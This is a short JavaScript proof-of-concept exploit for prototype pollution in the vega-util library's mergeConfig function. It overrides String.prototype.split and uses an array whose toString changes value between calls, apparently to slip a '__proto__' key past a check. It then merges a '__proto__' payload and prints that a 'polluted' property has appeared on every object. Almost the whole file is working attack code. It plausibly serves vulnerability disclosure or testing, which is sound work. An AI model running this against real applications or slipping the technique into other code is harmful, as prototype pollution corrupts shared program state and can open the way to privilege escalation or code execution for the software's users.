var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const util = require('vega-util');
const config = '{style: {point: {shape: triangle-right}}}';
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
util.mergeConfig(config, JSON.parse(malicious_payload));
console.log({}.polluted);